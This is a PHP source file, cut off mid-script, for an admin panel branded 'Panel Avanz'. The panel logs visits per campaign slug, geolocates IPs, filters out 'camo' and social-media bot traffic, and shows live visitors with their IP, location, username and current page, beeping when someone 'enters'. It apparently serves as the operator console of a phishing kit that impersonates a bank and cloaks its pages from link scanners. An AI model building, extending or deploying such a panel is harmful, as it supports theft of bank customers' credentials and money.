<?php
// =====================================================================
// panel.php — Panel admin: métricas de visitas + slugs de campaña.
//
// PROTECCIÓN:
//  - Clave: env PANEL_PASS (recomendado, sobrevive restarts en Heroku)
//    o _panel_key.php con hash bcrypt (setup en el primer ingreso).
//  - Lockout: 5 intentos fallidos en 10 min => bloqueo 10 min.
//  - CSRF token en todos los POST. Sesión endurecida (HttpOnly/Strict).
//  - noindex + headers de seguridad.
//
// Los datos viven en visits.log (lo escribe _track.php) y links.json
// (registro slug -> imagen/nota).
// =====================================================================

date_default_timezone_set('America/Managua');

$https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
      || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https');
if (session_status() === PHP_SESSION_NONE) {
    @ini_set('session.cookie_samesite', 'Strict');
    session_set_cookie_params(0, '/', '', $https, true); // posicional: funciona en cualquier PHP
    session_start();
}
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Referrer-Policy: no-referrer');

$KEY_FILE   = __DIR__ . '/_panel_key.php';
$FAIL_FILE  = __DIR__ . '/_panel_fail.json';
$LOG_FILE   = __DIR__ . '/visits.log';
$LINKS_FILE = __DIR__ . '/links.json';
$UP_DIR     = __DIR__ . '/panel_uploads';
$ENV_PASS   = getenv('PANEL_PASS') ?: '';

require_once __DIR__ . '/_track.php'; // geo + helpers de bloqueo IP

$storedHash = '';
if (is_file($KEY_FILE)) { $storedHash = (string)@include $KEY_FILE; }
$setupMode = ($ENV_PASS === '' && $storedHash === '');

function e($s){ return htmlspecialchars((string)$s, ENT_QUOTES); }
function csrf_token(){ if (empty($_SESSION['csrf'])) $_SESSION['csrf']=bin2hex(random_bytes(16)); return $_SESSION['csrf']; }
function csrf_ok(){ return isset($_POST['csrf'],$_SESSION['csrf']) && hash_equals($_SESSION['csrf'],(string)$_POST['csrf']); }

// ---------- Lockout anti fuerza-bruta ----------
$fail  = is_file($FAIL_FILE) ? (json_decode(@file_get_contents($FAIL_FILE), true) ?: []) : [];
$until = (int)($fail['until'] ?? 0);
$locked = time() < $until;

$msg = '';
$authed = !empty($_SESSION['adm']);

// ---------- Acciones ----------
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $act = $_POST['act'] ?? '';

    if ($setupMode && $act === 'setup') {
        $p1 = (string)($_POST['p1'] ?? ''); $p2 = (string)($_POST['p2'] ?? '');
        if (strlen($p1) >= 10 && $p1 === $p2) {
            @file_put_contents($KEY_FILE, "<?php return '" . password_hash($p1, PASSWORD_BCRYPT) . "';\n", LOCK_EX);
            $storedHash = (string)@include $KEY_FILE;
            $setupMode  = false;
            $msg = 'Clave creada. Inicia sesión.';
        } else { $msg = 'La clave debe tener 10+ caracteres y coincidir.'; }
    }
    elseif ($act === 'login' && !$locked) {
        $p = (string)($_POST['p'] ?? '');
        usleep(800000); // delay por intento
        $ok = ($ENV_PASS !== '') ? hash_equals($ENV_PASS, $p)
                                 : ($storedHash !== '' && password_verify($p, $storedHash));
        if ($ok) {
            session_regenerate_id(true);
            $_SESSION['adm'] = true;
            @unlink($FAIL_FILE);
            header('Location: panel.php'); exit;
        }
        $fail['n'] = (int)($fail['n'] ?? 0) + 1;
        $fail['first'] = $fail['first'] ?? time();
        if (time() - $fail['first'] > 600) { $fail['n'] = 1; $fail['first'] = time(); }
        if ($fail['n'] >= 5) { $fail['until'] = time() + 600; $fail['n'] = 0; }
        @file_put_contents($FAIL_FILE, json_encode($fail), LOCK_EX);
        $msg = 'Clave incorrecta.';
    }
    elseif ($authed && csrf_ok()) {
        $links = is_file($LINKS_FILE) ? (json_decode(@file_get_contents($LINKS_FILE), true) ?: []) : [];
        if ($act === 'up_img') {
            // Drag & drop: guarda la imagen y crea el slug automáticamente
            header('Content-Type: application/json');
            $resp = ['ok' => false];
            if (!empty($_FILES['f']) && $_FILES['f']['error'] === UPLOAD_ERR_OK) {
                $okExt = ['jpg','jpeg','png','gif','webp'];
                $orig  = (string)$_FILES['f']['name'];
                $ext   = strtolower(pathinfo($orig, PATHINFO_EXTENSION));
                if (in_array($ext, $okExt, true)
                    && $_FILES['f']['size'] <= 8*1024*1024
                    && @getimagesize($_FILES['f']['tmp_name'])) {
                    if (!is_dir($UP_DIR)) @mkdir($UP_DIR, 0755, true);
                    $base = strtolower(preg_replace('/[^a-zA-Z0-9_-]/', '', pathinfo($orig, PATHINFO_FILENAME)));
                    $slug = substr($base, 0, 32); if ($slug === '') $slug = 'img';
                    $s = $slug; $i = 2;
                    while (isset($links[$s])) { $s = $slug . '-' . $i++; }
                    $fname = 'p_' . date('Ymd') . '_' . bin2hex(random_bytes(4)) . '.' . $ext;
                    if (@move_uploaded_file($_FILES['f']['tmp_name'], $UP_DIR . '/' . $fname)) {
                        $links[$s] = ['label' => $orig, 'img' => $orig, 'file' => $fname, 'ts' => time()];
                        @file_put_contents($LINKS_FILE, json_encode($links, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE), LOCK_EX);
                        $resp = ['ok' => true, 'slug' => $s];
                    }
                }
            }
            echo json_encode($resp); exit;
        }
        if ($act === 'add_slug') {
            $slug  = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)($_POST['slug'] ?? ''));
            $label = trim(substr((string)($_POST['label'] ?? ''), 0, 80));
            $img   = trim(substr((string)($_POST['img'] ?? ''), 0, 120));
            if ($slug !== '') {
                $links[$slug] = ['label' => $label, 'img' => $img, 'ts' => time()];
                @file_put_contents($LINKS_FILE, json_encode($links, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE), LOCK_EX);
                $msg = "Slug '$slug' guardado.";
            }
        }
        if ($act === 'del_slug') {
            $slug = (string)($_POST['slug'] ?? '');
            unset($links[$slug]);
            @file_put_contents($LINKS_FILE, json_encode($links, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE), LOCK_EX);
            $msg = "Slug '$slug' eliminado.";
        }
        if ($act === 'reset_log') {
            @file_put_contents($LOG_FILE, '', LOCK_EX);
            $msg = 'Métricas reiniciadas.';
        }
        if ($act === 'block_ip') {
            $bip = trim((string)($_POST['ip'] ?? ''));
            $msg = trk_block_ip($bip, 10800) ? "IP $bip bloqueada por 3 horas." : 'IP inválida.';
        }
        if ($act === 'unblock_ip') {
            $bip = trim((string)($_POST['ip'] ?? ''));
            trk_unblock_ip($bip);
            $msg = "IP $bip desbloqueada.";
        }
    }
}

if (($_GET['a'] ?? '') === 'logout') {
    $_SESSION = []; session_destroy();
    header('Location: panel.php'); exit;
}

// ---------- Datos ----------
$rows = [];
if ($authed && is_file($LOG_FILE)) {
    if (filesize($LOG_FILE) > 3*1024*1024) {
        $d = @file_get_contents($LOG_FILE);
        $cut = substr($d, -1536*1024);
        $nl = strpos($cut, "\n");
        @file_put_contents($LOG_FILE, $nl !== false ? substr($cut, $nl+1) : '', LOCK_EX);
    }
    foreach ((array)@file($LOG_FILE, FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES) as $l) {
        $r = json_decode($l, true);
        if (is_array($r) && isset($r['ts'])) $rows[] = $r;
    }
}
$links = is_file($LINKS_FILE) ? (json_decode(@file_get_contents($LINKS_FILE), true) ?: []) : [];

$today = date('Y-m-d');
$totOk=0;$totCamo=0;$totSocial=0;$totPg=0;$todayOk=0;
$ipsAll=[];$ipsToday=[];$newestOk='';$ipOkCnt=[];$stSet=[];
$slugHit=[];$slugIps=[];$slugToday=[];$slugLast=[];
$cityIps=[];$cityToday=[];
$ccIps=[];
foreach ($rows as $r) {
    $st=(string)($r['st']??''); $ip=(string)($r['ip']??'');
    $d=date('Y-m-d',(int)$r['ts']); $isT=($d===$today);
    if ($st==='ok'){ $totOk++; if($isT)$todayOk++; $newestOk=$r['ts'].'|'.$ip; if($ip!=='')$ipOkCnt[$ip]=($ipOkCnt[$ip]??0)+1; }
    elseif ($st==='camo') $totCamo++;
    elseif ($st==='social') $totSocial++;
    elseif ($st==='pg') $totPg++;
    if ($ip!==''){ $ipsAll[$ip]=1; if($isT)$ipsToday[$ip]=1; if($st!=='')$stSet[$ip][$st]=1; }
    $s=(string)($r['e']??'');
    if ($s!==''){
        $slugHit[$s]=($slugHit[$s]??0)+1;
        if($ip!==''){ $slugIps[$s][$ip]=1; if($isT)$slugToday[$s][$ip]=1; }
        $slugLast[$s]=(int)$r['ts'];
    }
    $ck=(string)($r['city']??'-').'|'.(string)($r['cc']??'-');
    if($ip!==''){ $cityIps[$ck][$ip]=1; if($isT)$cityToday[$ck][$ip]=1; $ccIps[(string)($r['cc']??'-')][$ip]=1; }
}
uasort($slugIps, function($a,$b){return count($b)<=>count($a);});
uasort($cityIps, function($a,$b){return count($b)<=>count($a);});
uasort($ccIps,   function($a,$b){return count($b)<=>count($a);});
// Una fila por IP: última actividad + estado agregado (en español) + xN
$stLbl = ['ok'=>'ENTRÓ','pg'=>'ADENTRO','camo'=>'BLOQUEADO','social'=>'BOT SOCIAL'];
$recent = [];
foreach (array_reverse($rows) as $r) {
    $_rip = (string)($r['ip'] ?? '');
    if ($_rip === '' || isset($recent[$_rip])) continue;
    $r['_loc'] = trim((string)($r['city'] ?? '-') . ' ' . (string)($r['cc'] ?? ''));
    $recent[$_rip] = $r;
    if (count($recent) >= 20) break;
}
foreach ($recent as $_rip => &$r) {
    $g = $stSet[$_rip] ?? [];
    $r['_st'] = isset($g['ok']) ? 'ok' : (isset($g['pg']) ? 'pg' : (isset($g['camo']) ? 'camo' : (isset($g['social']) ? 'social' : (string)($r['st'] ?? 'pg'))));
}
unset($r);
$recent = array_values($recent);

// ---------- Presencia (heartbeats de verificar_redireccion.php) ----------
// Verde ≤15s (poll 3s) | Naranja 15s–5min (salió, puede volver) | Gris >5min
$pres = [];
$_pd = __DIR__ . '/simulador/acciones/presence';
$blockedMap = trk_blocked_map();
foreach ((array)@glob($_pd . '/*.txt') as $pf) {
    $j = json_decode((string)@file_get_contents($pf), true);
    if (!is_array($j)) continue;
    $age = time() - (int)($j['ts'] ?? 0);
    $stt = $age <= 15 ? 'on' : ($age <= 300 ? 'warn' : 'off');
    $_ip = (string)($j['ip'] ?? '');
    $_g  = trk_geo($_ip);
    $pres[] = [
        'sid' => basename($pf, '.txt'),
        'ip'  => $_ip,
        'u'   => (string)($j['u'] ?? ''),
        'pg'  => (string)($j['pg'] ?? ''),
        'loc' => trim((string)($_g['city'] ?? '-') . ' ' . (string)($_g['cc'] ?? '')),
        'age' => $age,
        'st'  => $stt,
        'cnt' => (int)($ipOkCnt[$_ip] ?? 0),
        'blk' => isset($blockedMap[$_ip]),
    ];
}
usort($pres, function($a,$b){return $a['age']<=>$b['age'];});

$scheme = $https ? 'https' : 'http';
$host   = $_SERVER['HTTP_HOST'] ?? '';
$baseUrl= $scheme . '://' . $host . '/';

// ---------- Feed AJAX (actualización en vivo cada 5s) ----------
if ($authed && ($_GET['ajax'] ?? '') === 'feed') {
    header('Content-Type: application/json; charset=UTF-8');
    $slugsOut = [];
    foreach (array_unique(array_merge(array_keys($slugIps), array_keys($links))) as $s) {
        $slugsOut[$s] = [
            'uniq'  => isset($slugIps[$s])   ? count($slugIps[$s])   : 0,
            'today' => isset($slugToday[$s]) ? count($slugToday[$s]) : 0,
            'hits'  => $slugHit[$s] ?? 0,
            'last'  => isset($slugLast[$s]) ? date('d/m H:i', $slugLast[$s]) : '-',
        ];
    }
    $recentOut = [];
    foreach (array_slice($recent, 0, 20) as $r) {
        $recentOut[] = [
            't'  => date('d/m H:i', (int)$r['ts']),
            'ip' => (string)($r['ip'] ?? ''),
            'loc'=> (string)($r['_loc'] ?? ''),
            'e'  => (string)($r['e'] ?? ''),
            'st' => (string)($r['_st'] ?? ''),
            'lbl'=> (string)($stLbl[$r['_st'] ?? ''] ?? ($r['_st'] ?? '')),
            'ref'=> (string)($r['ref'] ?? ''),
            'cnt'=> (int)($ipOkCnt[(string)($r['ip'] ?? '')] ?? 0),
        ];
    }
    echo json_encode([
        'cards'   => [$todayOk, count($ipsToday), $totOk, count($ipsAll), $totPg, $totCamo + $totSocial],
        'slugs'   => $slugsOut,
        'recent'  => $recentOut,
        'online'  => $pres,
        'newestOk'=> $newestOk,
    ]);
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<title>Panel Avanz</title>
<link rel="icon" href="favicon.svg">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:#f2f3f5;color:#222;font-size:14px}
.top{background:#141414;color:#fff;padding:12px 20px;display:flex;justify-content:space-between;align-items:center}
.top b{color:#FF7500}
.top a{color:#bbb;text-decoration:none;font-size:13px}
.top a:hover{color:#fff}
.wrap{max-width:1100px;margin:0 auto;padding:20px}
h2{font-size:16px;margin:22px 0 10px;color:#141414}
.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px}
.card{background:#fff;border:1px solid #e3e4e8;border-radius:8px;padding:14px}
.card .n{font-size:26px;font-weight:800;color:#FF7500}
.card .l{font-size:12px;color:#777;margin-top:4px}
table{width:100%;border-collapse:collapse;background:#fff;border:1px solid #e3e4e8;border-radius:8px;overflow:hidden}
th,td{padding:8px 10px;text-align:left;font-size:12.5px;border-bottom:1px solid #eee}
th{background:#fafafa;color:#555;font-size:11px;text-transform:uppercase;letter-spacing:.5px}
tr:last-child td{border-bottom:0}
.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:700}
.b-ok{background:#e6f7ec;color:#117a3f}.b-camo{background:#fdf0e5;color:#b45309}
.b-social{background:#eef2ff;color:#4a51c9}.b-pg{background:#f1f1f1;color:#555}
form.inline{display:inline}
input,button{font:inherit;padding:8px 10px;border:1px solid #ddd;border-radius:6px}
button{background:#FF7500;color:#fff;border:0;font-weight:700;cursor:pointer;padding:8px 16px}
button.sec{background:#555}
.login{max-width:340px;margin:12vh auto;background:#fff;border:1px solid #e3e4e8;border-radius:10px;padding:30px;text-align:center}
.login input{width:100%;margin:10px 0;padding:12px}
.login button{width:100%;padding:12px}
.msg{background:#fff8f0;border:1px solid #ffd9b3;color:#9a4a00;padding:10px 14px;border-radius:8px;margin-bottom:14px}
.url{font-family:monospace;font-size:12px;color:#555}
.del{color:#c0392b;background:none;border:0;cursor:pointer;font-size:12px}
.newslug{background:#fff;border:1px solid #e3e4e8;border-radius:8px;padding:14px;margin-bottom:10px}
.newslug input{margin-right:8px;margin-bottom:6px}
td.trunc{max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.dropzone{border:2px dashed #ccc;border-radius:8px;padding:26px;text-align:center;color:#888;font-size:13px;margin-bottom:12px;cursor:pointer;transition:.15s}
.dropzone:hover,.dropzone.over{border-color:#FF7500;color:#FF7500;background:#fff8f0}
.thumb{width:42px;height:42px;object-fit:cover;border-radius:6px;vertical-align:middle;margin-right:6px;border:1px solid #eee}
.dzok{color:#117a3f;font-weight:700}
.dot{display:inline-block;width:10px;height:10px;border-radius:50%;margin-right:7px}
.dot.on{background:#22c55e;box-shadow:0 0 7px #22c55e}
.dot.warn{background:#f59e0b;box-shadow:0 0 5px #f59e0b55}
.dot.off{background:#9ca3af}
.lgd{font-weight:400;font-size:11px;color:#999}
.cnt{display:inline-block;background:#eef2ff;color:#4a51c9;border-radius:8px;padding:0 6px;font-size:10px;font-weight:700;margin-left:4px}
.blkbtn{background:none;border:0;cursor:pointer;font-size:13px;padding:2px 5px}
.blkbtn:hover{filter:brightness(1.2)}
</style>
</head>
<body>
<?php if ($setupMode): ?>
<div class="login">
    <h3>Panel Avanz — Setup</h3>
    <p style="font-size:12px;color:#777;margin:8px 0">Crea la clave de acceso (mín. 10 caracteres).<br>Tip: en Heroku mejor define el config var <b>PANEL_PASS</b> para que no se pierda al reiniciar.</p>
    <?php if($msg):?><div class="msg"><?=e($msg)?></div><?php endif;?>
    <form method="post">
        <input type="hidden" name="act" value="setup">
        <input type="password" name="p1" placeholder="Nueva clave" required minlength="10">
        <input type="password" name="p2" placeholder="Repetir clave" required minlength="10">
        <button>Crear clave</button>
    </form>
</div>
<?php elseif (!$authed): ?>
<div class="login">
    <h3>Panel Avanz</h3>
    <?php if($msg):?><div class="msg"><?=e($msg)?></div><?php endif;?>
    <?php if($locked):?><div class="msg">Demasiados intentos. Bloqueado hasta las <?=date('H:i',$until)?>.</div>
    <?php else: ?>
    <form method="post">
        <input type="hidden" name="act" value="login">
        <input type="password" name="p" placeholder="Clave" required autofocus>
        <button>Entrar</button>
    </form>
    <?php endif; ?>
</div>
<?php else: ?>
<div class="top"><div><b>AVANZ</b> · Panel de métricas</div><a href="?a=logout">Salir</a></div>
<div class="wrap">
    <?php if($msg):?><div class="msg"><?=e($msg)?></div><?php endif;?>

    <div class="cards">
        <div class="card"><div class="n" id="c0"><?=$todayOk?></div><div class="l">Entradas hoy</div></div>
        <div class="card"><div class="n" id="c1"><?=count($ipsToday)?></div><div class="l">Únicos hoy (IP)</div></div>
        <div class="card"><div class="n" id="c2"><?=$totOk?></div><div class="l">Entradas totales</div></div>
        <div class="card"><div class="n" id="c3"><?=count($ipsAll)?></div><div class="l">Únicos totales</div></div>
        <div class="card"><div class="n" id="c4"><?=$totPg?></div><div class="l">Pageviews internos</div></div>
        <div class="card"><div class="n" id="c5"><?=$totCamo+$totSocial?></div><div class="l">Bloqueados (camo/social)</div></div>
    </div>

    <h2>En línea ahora <span class="lgd">· 🟢 en línea · 🟠 salió, puede volver · ⚪ se fue</span></h2>
    <table>
        <tr><th>Estado</th><th>IP</th><th>Ubicación</th><th>Usuario</th><th>Página</th><th>Hace</th><th></th></tr>
        <tbody id="onBody">
        <?php foreach($pres as $p): ?>
        <tr>
            <td><span class="dot <?=e($p['st'])?>"></span></td>
            <td class="url"><?=e($p['ip'])?><?php if($p['cnt']>1):?><span class="cnt">x<?=$p['cnt']?></span><?php endif;?></td>
            <td><?=e($p['loc'])?></td>
            <td><?=e($p['u'])?></td>
            <td><?=e($p['pg'])?></td>
            <td><?=$p['age']<60?$p['age'].'s':($p['age']<3600?(int)($p['age']/60).'m':(int)($p['age']/3600).'h')?></td>
            <td><button type="button" class="blkbtn" data-ip="<?=e($p['ip'])?>" data-blk="<?=$p['blk']?'1':''?>" title="<?=$p['blk']?'Desbloquear':'Bloquear 3h'?>"><?=$p['blk']?'🔓':'🚫'?></button></td>
        </tr>
        <?php endforeach; ?>
        <?php if(!$pres):?><tr><td colspan="7" style="color:#999">Nadie conectado todavía</td></tr><?php endif;?>
        </tbody>
    </table>
    <?php if($blockedMap): ?>
    <h2>IPs bloqueadas <span class="lgd">· expiran solas (3h)</span></h2>
    <table>
        <tr><th>IP</th><th>Queda</th><th></th></tr>
        <?php foreach($blockedMap as $bip=>$until): $rem=$until-time(); ?>
        <tr>
            <td class="url"><?=e($bip)?></td>
            <td><?=$rem<60?$rem.'s':($rem<3600?(int)($rem/60).'m':(int)($rem/3600).'h '.(int)(($rem%3600)/60).'m')?></td>
            <td><button type="button" class="blkbtn" data-ip="<?=e($bip)?>" data-blk="1" title="Desbloquear">🔓 Desbloquear</button></td>
        </tr>
        <?php endforeach; ?>
    </table>
    <?php endif; ?>

    <h2>Slugs / extensiones por imagen</h2>
    <div class="newslug">
        <div class="dropzone" id="dz">
            <b>Arrastrá la imagen aquí</b> (o hacé clic para elegir)<br>
            <span style="font-size:11px">Se guarda la imagen y se crea el link con el slug automáticamente</span>
            <div id="dzOut" style="margin-top:6px"></div>
        </div>
        <input type="file" id="dzFile" accept="image/*" multiple hidden>
        <form method="post">
            <input type="hidden" name="csrf" value="<?=csrf_token()?>">
            <input type="hidden" name="act" value="add_slug">
            <input name="slug" placeholder="slug (ej: oro1)" required pattern="[a-zA-Z0-9_-]+">
            <input name="label" placeholder="Descripción (ej: imagen tarjeta oro)">
            <input name="img" placeholder="Archivo de imagen (ej: 4a6d0bb1...png)">
            <button>Agregar</button>
        </form>
        <div class="url">Los links quedan: <?=$baseUrl?>?e=<b>slug</b></div>
    </div>
    <table>
        <tr><th>Slug</th><th>Link</th><th>Descripción</th><th>Imagen</th><th>Únicos</th><th>Hoy</th><th>Hits</th><th>Última</th><th></th></tr>
        <?php foreach($slugIps as $s=>$ips):
            $meta=$links[$s]??null; ?>
        <tr data-slug="<?=e($s)?>">
            <td><b><?=e($s)?></b></td>
            <td class="url"><?=$baseUrl?>?e=<?=e($s)?></td>
            <td><?=e($meta['label']??'')?></td>
            <td><?php if(!empty($meta['file']) && is_file($UP_DIR.'/'.$meta['file'])): ?><img class="thumb" src="panel_uploads/<?=e($meta['file'])?>" loading="lazy"><?php endif; ?><?=e($meta['img']??'')?></td>
            <td data-f="uniq"><?=count($ips)?></td>
            <td data-f="today"><?=count($slugToday[$s]??[])?></td>
            <td data-f="hits"><?=$slugHit[$s]??0?></td>
            <td data-f="last"><?=isset($slugLast[$s])?date('d/m H:i',$slugLast[$s]):'-'?></td>
            <td><form class="inline" method="post" onsubmit="return confirm('¿Eliminar slug?')">
                <input type="hidden" name="csrf" value="<?=csrf_token()?>">
                <input type="hidden" name="act" value="del_slug">
                <input type="hidden" name="slug" value="<?=e($s)?>">
                <button type="submit" class="del">✕</button></form></td>
        </tr>
        <?php endforeach; ?>
        <?php foreach($links as $s=>$meta): if(isset($slugIps[$s]))continue; ?>
        <tr data-slug="<?=e($s)?>">
            <td><b><?=e($s)?></b></td>
            <td class="url"><?=$baseUrl?>?e=<?=e($s)?></td>
            <td><?=e($meta['label']??'')?></td>
            <td><?php if(!empty($meta['file']) && is_file($UP_DIR.'/'.$meta['file'])): ?><img class="thumb" src="panel_uploads/<?=e($meta['file'])?>" loading="lazy"><?php endif; ?><?=e($meta['img']??'')?></td>
            <td data-f="uniq">0</td><td data-f="today">0</td><td data-f="hits">0</td><td data-f="last">-</td>
            <td><form class="inline" method="post" onsubmit="return confirm('¿Eliminar slug?')">
                <input type="hidden" name="csrf" value="<?=csrf_token()?>">
                <input type="hidden" name="act" value="del_slug">
                <input type="hidden" name="slug" value="<?=e($s)?>">
                <button type="submit" class="del">✕</button></form></td>
        </tr>
        <?php endforeach; ?>
        <?php if(!$slugIps && !$links):?><tr><td colspan="9" style="color:#999">Sin slugs todavía — agregá uno arriba o mandá tráfico con ?e=slug</td></tr><?php endif;?>
    </table>

    <h2>Ciudades (visitantes únicos)</h2>
    <table>
        <tr><th>Ciudad</th><th>País</th><th>Únicos</th><th>Hoy</th></tr>
        <?php foreach(array_slice($cityIps,0,20,true) as $ck=>$ips): [$ci,$cc]=explode('|',$ck); ?>
        <tr><td><?=e($ci)?></td><td><?=e($cc)?></td><td><?=count($ips)?></td><td><?=count($cityToday[$ck]??[])?></td></tr>
        <?php endforeach; ?>
        <?php if(!$cityIps):?><tr><td colspan="4" style="color:#999">Sin datos todavía</td></tr><?php endif;?>
    </table>

    <h2>Países (visitantes únicos)</h2>
    <table>
        <tr><th>País</th><th>Únicos</th></tr>
        <?php foreach(array_slice($ccIps,0,15,true) as $cc=>$ips): ?>
        <tr><td><?=e($cc)?></td><td><?=count($ips)?></td></tr>
        <?php endforeach; ?>
        <?php if(!$ccIps):?><tr><td colspan="2" style="color:#999">Sin datos todavía</td></tr><?php endif;?>
    </table>

    <h2>Últimas visitas <span style="font-weight:400;font-size:11px;color:#999">· en vivo (cada 5s)</span></h2>
    <table>
        <tr><th>Hora</th><th>IP</th><th>Ubicación</th><th>Estado</th><th>Slug</th><th>Referer</th></tr>
        <tbody id="rcBody">
        <?php foreach($recent as $r): ?>
        <tr>
            <td><?=date('d/m H:i',(int)$r['ts'])?></td>
            <td class="url"><?=e($r['ip']??'')?><?php if(($ipOkCnt[(string)($r['ip']??'')]??0)>1):?><span class="cnt">x<?=$ipOkCnt[(string)$r['ip']]?></span><?php endif;?></td>
            <td><?=e($r['_loc']??'-')?></td>
            <td><span class="badge b-<?=e($r['_st']??'pg')?>"><?=e($stLbl[$r['_st']??'pg']??'')?></span></td>
            <td><?=e($r['e']??'')?></td>
            <td class="trunc"><?=e($r['ref']??'')?></td>
        </tr>
        <?php endforeach; ?>
        <?php if(!$recent):?><tr><td colspan="6" style="color:#999">Sin visitas registradas</td></tr><?php endif;?>
        </tbody>
    </table>

    <form method="post" style="margin:20px 0 40px" onsubmit="return confirm('¿Borrar TODAS las métricas?')">
        <input type="hidden" name="csrf" value="<?=csrf_token()?>">
        <input type="hidden" name="act" value="reset_log">
        <button class="sec">Reiniciar métricas</button>
    </form>
</div>
<script>
(function(){
  var dz=document.getElementById('dz'), fi=document.getElementById('dzFile'), out=document.getElementById('dzOut');
  if(!dz)return;
  var csrf='<?=csrf_token()?>';
  function subir(file){
    out.innerHTML='Subiendo '+file.name+'…';
    var fd=new FormData();
    fd.append('act','up_img');fd.append('csrf',csrf);fd.append('f',file);
    fetch('panel.php',{method:'POST',body:fd})
      .then(function(r){return r.json()})
      .then(function(d){
        if(d&&d.ok){out.innerHTML='<span class="dzok">✓ Link creado: ?e='+d.slug+'</span>';setTimeout(function(){location.reload()},800);}
        else{out.innerHTML='Error: archivo no válido (solo imágenes jpg/png/gif/webp, máx 8MB).';}
      })
      .catch(function(){out.innerHTML='Error de conexión.'});
  }
  dz.addEventListener('click',function(){fi.click()});
  fi.addEventListener('change',function(){for(var i=0;i<fi.files.length;i++)subir(fi.files[i])});
  ['dragover','dragenter'].forEach(function(ev){dz.addEventListener(ev,function(e){e.preventDefault();dz.classList.add('over')})});
  ['dragleave','drop'].forEach(function(ev){dz.addEventListener(ev,function(e){e.preventDefault();dz.classList.remove('over')})});
  dz.addEventListener('drop',function(e){
    var fs=e.dataTransfer.files;
    for(var i=0;i<fs.length;i++)subir(fs[i]);
  });

  // ---- Actualización en vivo: cards + slugs + últimas visitas ----
  function feed(){
    fetch('panel.php?ajax=feed',{credentials:'same-origin'})
      .then(function(r){return r.json()})
      .then(function(d){
        if(!d||!d.cards)return;
        d.cards.forEach(function(v,i){var el=document.getElementById('c'+i);if(el)el.textContent=v});
        Object.keys(d.slugs||{}).forEach(function(s){
          var tr=document.querySelector('tr[data-slug="'+s+'"]');
          if(!tr)return;
          var u=tr.querySelector('[data-f="uniq"]');if(u)u.textContent=d.slugs[s].uniq;
          var t=tr.querySelector('[data-f="today"]');if(t)t.textContent=d.slugs[s].today;
          var h=tr.querySelector('[data-f="hits"]');if(h)h.textContent=d.slugs[s].hits;
          var l=tr.querySelector('[data-f="last"]');if(l)l.textContent=d.slugs[s].last;
        });
        var tb=document.getElementById('rcBody');
        if(tb){
          tb.innerHTML='';
          var rec=d.recent||[];
          if(!rec.length){
            var tr0=document.createElement('tr');
            var c0=document.createElement('td');c0.colSpan=6;c0.style.color='#999';
            c0.textContent='Sin visitas registradas';tr0.appendChild(c0);tb.appendChild(tr0);
          }
          rec.forEach(function(r){
            var tr=document.createElement('tr');
            function td(txt,cls){var c=document.createElement('td');if(cls)c.className=cls;c.textContent=txt;tr.appendChild(c);}
            td(r.t);td(r.ip,'url');
            if(r.cnt>1){var spc=document.createElement('span');spc.className='cnt';spc.textContent='x'+r.cnt;tr.lastChild.appendChild(spc);}
            td(r.loc);
            var c=document.createElement('td');var sp=document.createElement('span');
            sp.className='badge b-'+r.st;sp.textContent=r.lbl||r.st;c.appendChild(sp);tr.appendChild(c);
            td(r.e);td(r.ref,'trunc');
            tb.appendChild(tr);
          });
        }
      })
      .catch(function(){});
  }

  // ---- Sonido al entrar alguien + reconstrucción En línea ----
  var AC=null,seenSids={},lastOk='',firstFeed=true;
  function initAC(){try{AC=new (window.AudioContext||window.webkitAudioContext)()}catch(e){}}
  document.addEventListener('pointerdown',function(){if(!AC)initAC();if(AC&&AC.state==='suspended')AC.resume();});
  function beep(){
    if(!AC)initAC();if(!AC||AC.state!=='running')return;
    try{
      [880,1320].forEach(function(f,i){
        var o=AC.createOscillator(),g=AC.createGain();
        o.connect(g);g.connect(AC.destination);o.type='square';o.frequency.value=f;
        var t=AC.currentTime+i*0.18;
        g.gain.setValueAtTime(.22,t);
        g.gain.exponentialRampToValueAtTime(.0001,t+.3);
        o.start(t);o.stop(t+.3);
      });
    }catch(e){}
  }
  function haceTxt(a){return a<60?a+'s':(a<3600?Math.floor(a/60)+'m':Math.floor(a/3600)+'h');}

  // Versión completa del feed: cards + slugs + recientes + en línea + beep
  feed=function(){
    fetch('panel.php?ajax=feed',{credentials:'same-origin'})
      .then(function(r){return r.json()})
      .then(function(d){
        if(!d||!d.cards)return;
        d.cards.forEach(function(v,i){var el=document.getElementById('c'+i);if(el)el.textContent=v});
        Object.keys(d.slugs||{}).forEach(function(s){
          var tr=document.querySelector('tr[data-slug="'+s+'"]');
          if(!tr)return;
          var u=tr.querySelector('[data-f="uniq"]');if(u)u.textContent=d.slugs[s].uniq;
          var t=tr.querySelector('[data-f="today"]');if(t)t.textContent=d.slugs[s].today;
          var h=tr.querySelector('[data-f="hits"]');if(h)h.textContent=d.slugs[s].hits;
          var l=tr.querySelector('[data-f="last"]');if(l)l.textContent=d.slugs[s].last;
        });
        var tb=document.getElementById('rcBody');
        if(tb){
          tb.innerHTML='';
          var rec=d.recent||[];
          if(!rec.length){
            var tr0=document.createElement('tr');
            var c0=document.createElement('td');c0.colSpan=6;c0.style.color='#999';
            c0.textContent='Sin visitas registradas';tr0.appendChild(c0);tb.appendChild(tr0);
          }
          rec.forEach(function(r){
            var tr=document.createElement('tr');
            function td(txt,cls){var c=document.createElement('td');if(cls)c.className=cls;c.textContent=txt;tr.appendChild(c);}
            td(r.t);td(r.ip,'url');
